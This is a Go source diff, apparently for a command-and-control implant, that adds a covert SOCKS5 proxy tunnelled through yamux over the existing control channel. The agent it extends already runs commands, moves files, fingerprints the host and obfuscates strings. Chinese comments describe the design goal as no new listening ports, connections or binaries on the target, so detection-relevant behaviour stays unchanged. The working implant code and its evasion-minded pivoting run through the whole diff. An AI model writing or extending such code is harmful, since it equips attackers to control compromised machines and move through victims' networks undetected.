@@ -3,11 +3,14 @@ package main
 
 import (
 	"bufio"
+	"io"
+
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/json"
 	"flag"
 	"fmt"
+	"github.com/hashicorp/yamux"
 	"math/rand"
 	"net"
 	"os"
@@ -21,7 +24,9 @@ import (
 	"sync"
 	"time"
 
+	"coreutil/internal/link"
 	"coreutil/internal/proto"
+	"coreutil/internal/relay"
 	"coreutil/internal/tlsx"
 	"coreutil/internal/ws"
 	"crypto/tls"
@@ -221,7 +226,7 @@ func lookupBg(id string) *bgTask {
 	return bgReg[id]
 }
 
-func runTask(t *proto.Msg) *proto.Msg {
+func runTask(t *proto.Msg, hub *link.Hub) *proto.Msg {
 	res := &proto.Msg{Type: proto.MsgResult, TaskID: t.TaskID, Task: t.Task, OK: false}
 	switch t.Task {
 	case proto.TaskExec:
@@ -298,9 +303,9 @@ func runTask(t *proto.Msg) *proto.Msg {
 			runtime.GOOS, runtime.GOARCH, host(), whoami(), os.Getpid(), cwd())
 		res.OK = true
 	case proto.TaskUpload:
-		return runTask(&proto.Msg{Type: proto.MsgTask, TaskID: t.TaskID, Task: proto.TaskWrite, Path: t.Path, Data: t.Data})
+		return runTask(&proto.Msg{Type: proto.MsgTask, TaskID: t.TaskID, Task: proto.TaskWrite, Path: t.Path, Data: t.Data}, hub)
 	case proto.TaskDownload:
-		return runTask(&proto.Msg{Type: proto.MsgTask, TaskID: t.TaskID, Task: proto.TaskRead, Path: t.Path})
+		return runTask(&proto.Msg{Type: proto.MsgTask, TaskID: t.TaskID, Task: proto.TaskRead, Path: t.Path}, hub)
 	case proto.TaskKill:
 		res.OK = true
 		res.Stdout = "bye"
@@ -405,6 +410,13 @@ func runTask(t *proto.Msg) *proto.Msg {
 		bt.mu.Unlock()
 		res.OK = true
 		res.Stdout = "killed " + t.BgID
+	case proto.TaskSocks:
+		if err := serveSocksOn(hub, t.MuxID); err != nil {
+			res.Err = err.Error()
+			return res
+		}
+		res.OK = true
+		res.Stdout = fmt.Sprintf("socks serving on mux %d", t.MuxID)
 	default:
 		res.Err = dec(_obfUnk) + string(t.Task)
 	}
@@ -625,9 +637,70 @@ func dialTCP(addr string) (net.Conn, error) {
 	return conn, nil
 }
 
+// ---- 穿透（在 mux 通道上跑 SOCKS5 服务端）----
+//
+// 数据通路：控制侧本地监听 → yamux 流 → 本文件 |relay.Serve| → 目标（本机网络栈）。
+// 要点：目标机上**不开监听端口**、**不新增连接**、**不新增第三方二进制**；
+// 隧道流量复用已有控制连接（OPSEC 行为面零变化）。
+var (
+	socksMu   sync.Mutex
+	socksSess = map[uint32]*yamux.Session{}
+)
+
+func agentYamuxCfg() *yamux.Config {
+	c := yamux.DefaultConfig()
+	if *quiet {
+		c.LogOutput = io.Discard
+	}
+	return c
+}
+
+// serveSocksOn 在 mux 通道 muxID 上开 yamux 服务端并逐流跑 SOCKS5。
+func serveSocksOn(hub *link.Hub, muxID uint32) error {
+	c := hub.Get(muxID)
+	if c == nil {
+		return fmt.Errorf("mux channel %d not open", muxID)
+	}
+	sess, err := yamux.Server(c, agentYamuxCfg())
+	if err != nil {
+		return err
+	}
+	socksMu.Lock()
+	if old := socksSess[muxID]; old != nil {
+		_ = old.Close()
+	}
+	socksSess[muxID] = sess
+	socksMu.Unlock()
+	logf("socks: serving on mux channel %d", muxID)
+	go func() {
+		defer func() {
+			socksMu.Lock()
+			if socksSess[muxID] == sess {
+				delete(socksSess, muxID)
+			}
+			socksMu.Unlock()
+			_ = sess.Close()
+			logf("socks: mux channel %d closed", muxID)
+		}()
+		for {
+			st, err := sess.AcceptStream()
+			if err != nil {
+				return
+			}
+			go func() {
+				// 域名原样交给本地解析（socks5h 语义在 relay 侧保证）
+				_ = relay.Serve(st, func(nw, addr string) (net.Conn, error) {
+					return net.DialTimeout(nw, addr, 10*time.Second)
+				}, logf)
+			}()
+		}
+	}()
+	return nil
+}
+
 // handleConn 处理一次连接生命周期
-func handleConn(link msgLink) {
-	defer link.Close()
+func handleConn(ln msgLink) {
+	defer ln.Close()
 	// Phase A: 异步执行任务。runTask 在 goroutine 里跑，主循环立即继续 Recv，
 	// 长 exec 不再阻塞 rtx_read / 其它 rtx_exec（agent 单线程消息循环的根因）。
 	// server 端 dispatch 按 TaskID 路由 result（pending sync.Map），天然支持乱序回传，
@@ -637,8 +710,9 @@ func handleConn(link msgLink) {
 	send := func(m *proto.Msg) error {
 		sendMu.Lock()
 		defer sendMu.Unlock()
-		return link.Send(m)
+		return ln.Send(m)
 	}
+	hub := link.NewHub(send)
 	hello := &proto.Msg{
 		Type:     proto.MsgHello,
 		AgentID:  *agentID,
@@ -653,14 +727,17 @@ func handleConn(link msgLink) {
 		return
 	}
 	for {
-		m, err := link.Recv()
+		m, err := ln.Recv()
 		if err != nil {
 			return
+		}
+		if hub.Handle(m) {
+			continue // mux 流式承载：已由 link.Hub 消费，非控制消息
 		}
 		switch m.Type {
 		case proto.MsgTask:
 			go func(m *proto.Msg) {
-				res := runTask(m)
+				res := runTask(m, hub)
 				_ = send(res) // 发送失败只忽略；主循环 Recv 会感知断连并退出
 			}(m)
 		case proto.MsgPing:
